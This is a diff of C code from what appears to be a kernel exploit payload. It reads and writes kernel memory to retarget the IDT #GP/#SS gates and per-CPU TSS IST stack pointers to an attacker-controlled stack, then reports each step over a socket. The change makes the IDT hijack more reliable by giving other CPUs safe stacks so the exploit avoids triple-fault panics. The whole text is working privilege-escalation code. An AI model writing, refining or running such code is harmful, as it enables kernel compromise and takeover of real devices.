@@ -4076,11 +4076,13 @@ broad_done:
         void *sigalt_stack = NULL;
         uint64_t tss_va = 0;
         int tss_stride = 0;
-        #define GP_TRAP_MAX_CPUS 8
+        #define GP_TRAP_MAX_CPUS 16
         int ist_modified_percpu[GP_TRAP_MAX_CPUS][7];
         uint64_t ist_saved_percpu[GP_TRAP_MAX_CPUS][7];
+        uint64_t cpu_rsp0[GP_TRAP_MAX_CPUS];
         memset(ist_modified_percpu, 0, sizeof(ist_modified_percpu));
         memset(ist_saved_percpu, 0, sizeof(ist_saved_percpu));
+        memset(cpu_rsp0, 0, sizeof(cpu_rsp0));
         int idt_gate_modified = 0;
         uint8_t idt_gate_saved[16];
         int ss_gate_modified = 0;
@@ -4503,22 +4505,54 @@ broad_done:
                 send_response(sock, "  WARNING: cannot read #SS gate\n");
             }
         }
-        /* Count CPUs and save their current IST values */
+        /* Count CPUs and save their current IST values.
+         *
+         * CRITICAL: The IDT is shared across ALL CPUs.  If we patch the
+         * IDT #GP gate to use IST7, then EVERY CPU needs a valid IST7
+         * value.  If any CPU has IST7=0, a natural #GP on that CPU
+         * sets RSP=0 → triple fault → kernel panic.
+         *
+         * We use RELAXED validation here: just check that we can read
+         * the IST field from the TSS.  We log each CPU's status for
+         * diagnostics.
+         */
         {
             int idx = gp_ist_index - 1;
             for (int cpu = 0; cpu < GP_TRAP_MAX_CPUS && tss_stride > 0; cpu++) {
                 uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
                 uint32_t rsvd0;
                 uint64_t rsp0;
-                if (kernel_copyout(cpu_tss, &rsvd0, 4) != 0 || rsvd0 != 0)
+
+                /* Try to read TSS fields for this CPU */
+                if (kernel_copyout(cpu_tss, &rsvd0, 4) != 0) {
+                    send_response(sock, "  CPU%d: read failed at 0x%lx, stopping\n",
+                                  cpu, cpu_tss);
                     break;
-                if (kernel_copyout(cpu_tss + 4, &rsp0, 8) != 0 || rsp0 == 0)
-                    break;
-                ist_saved_percpu[cpu][idx] = kernel_getlong(cpu_tss + 0x24 + idx * 8);
+                }
+
+                /* Read RSP0 — used as safe fallback IST value for non-trigger CPUs */
+                if (kernel_copyout(cpu_tss + 4, &rsp0, 8) != 0)
+                    rsp0 = 0;
+                cpu_rsp0[cpu] = rsp0;
+
+                /* Read the current IST value — this is what we MUST save */
+                uint64_t ist_val = kernel_getlong(cpu_tss + 0x24 + idx * 8);
+                ist_saved_percpu[cpu][idx] = ist_val;
                 num_cpus_found = cpu + 1;
+
+                send_response(sock, "  CPU%d TSS@0x%lx: rsvd=%u rsp0=0x%lx IST%d=0x%lx%s\n",
+                              cpu, cpu_tss, rsvd0, rsp0, gp_ist_index, ist_val,
+                              rsvd0 != 0 ? " (rsvd!=0)" : "");
             }
             send_response(sock, "  Found %d CPUs, IST%d saved (NOT patched yet)\n",
                           num_cpus_found, gp_ist_index);
+            if (num_cpus_found < 2) {
+                send_response(sock, "  WARNING: only %d CPU(s) found — IDT is shared!\n"
+                              "  Other CPUs with IST%d=0 WILL crash on #GP.\n"
+                              "  Aborting IST patching.\n",
+                              num_cpus_found, gp_ist_index);
+                goto step7_cleanup;
+            }
         }
 
         /* 7f. Pin to CPU 0 (cascading fallback) */
@@ -4796,10 +4830,40 @@ broad_done:
          * signal.  We check both signal mc_rip and IST page RIP.
          */
         /* Apply IDT/TSS patches NOW — just before the trigger.
-         * Every microsecond these are active, any natural #GP/#SS
-         * on either CPU overflows our tiny IST stack → panic.
-         * We apply as late as possible and restore immediately after. */
-        send_response(sock, "\n  Applying IDT/TSS patches...\n");
+         * We apply as late as possible and restore immediately after.
+         *
+         * IMPORTANT: The IDT is shared across ALL CPUs.  CPU0 gets
+         * our IST page (for the race).  Other CPUs get their RSP0
+         * (safe kernel stack), so a natural #GP on them is handled
+         * normally instead of crashing with IST7=0. */
+        /* Step 1: Set TSS IST entries on ALL CPUs FIRST — before
+         * touching the IDT.  This ensures no CPU has IST7=0 when
+         * the IDT starts using it. */
+        send_response(sock, "\n  Applying TSS patches (all CPUs first)...\n");
+        {
+            int idx = gp_ist_index - 1;
+            for (int cpu = 0; cpu < num_cpus_found; cpu++) {
+                uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
+                uint64_t new_ist;
+                if (cpu == 0) {
+                    /* CPU0: use our IST page (for the race) */
+                    new_ist = ist_stack_top;
+                } else {
+                    /* Other CPUs: use their RSP0 (safe kernel stack).
+                     * This mimics IST=0 behavior so any natural #GP
+                     * on these CPUs is handled normally. */
+                    new_ist = cpu_rsp0[cpu];
+                    if (new_ist == 0) new_ist = ist_stack_top; /* fallback */
+                }
+                kernel_setlong(cpu_tss + 0x24 + idx * 8, new_ist);
+                ist_modified_percpu[cpu][idx] = 1;
+                send_response(sock, "  CPU%d IST%d -> 0x%lx%s\n",
+                              cpu, gp_ist_index, new_ist,
+                              cpu == 0 ? " (IST page)" : " (RSP0 safe)");
+            }
+        }
+        /* Step 2: NOW patch the IDT gates — all CPUs have valid IST7 */
+        send_response(sock, "  Patching IDT gates...\n");
         if (gp_needs_patch) {
             uint8_t new_byte = (idt_gate_saved[4] & 0xF8) | 7;
             kernel_setchar(idt_access + 13 * 16 + 4, new_byte);
@@ -4811,16 +4875,6 @@ broad_done:
             kernel_setchar(idt_access + 12 * 16 + 4, new_byte);
             ss_gate_modified = 1;
             send_response(sock, "  #SS gate IST -> 7\n");
-        }
-        {
-            int idx = gp_ist_index - 1;
-            for (int cpu = 0; cpu < num_cpus_found; cpu++) {
-                uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
-                kernel_setlong(cpu_tss + 0x24 + idx * 8, ist_stack_top);
-                ist_modified_percpu[cpu][idx] = 1;
-                send_response(sock, "  CPU%d IST%d -> 0x%lx\n",
-                              cpu, gp_ist_index, ist_stack_top);
-            }
         }
 
         send_response(sock, "\n  WARNING: IDT is now live — each attempt risks\n"
